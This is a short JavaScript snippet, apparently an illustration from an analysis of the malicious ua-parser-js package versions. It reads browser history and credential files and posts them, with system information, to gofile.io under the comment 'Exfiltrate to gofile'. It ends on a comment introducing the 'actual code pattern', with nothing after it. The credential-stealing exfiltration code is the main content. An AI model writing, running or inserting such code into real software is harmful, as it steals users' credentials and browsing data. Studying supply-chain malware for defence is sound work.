const browserHistory = fs.readFileSync('path/to/browser/history');
const credentials = fs.readFileSync('path/to/credentials');

// Exfiltrate to gofile
fetch('https://gofile.io/upload', {
  method: 'POST',
  body: { sysInfo, browserHistory, credentials }
});

// Actual code pattern from the malicious ua-parser-js versions:
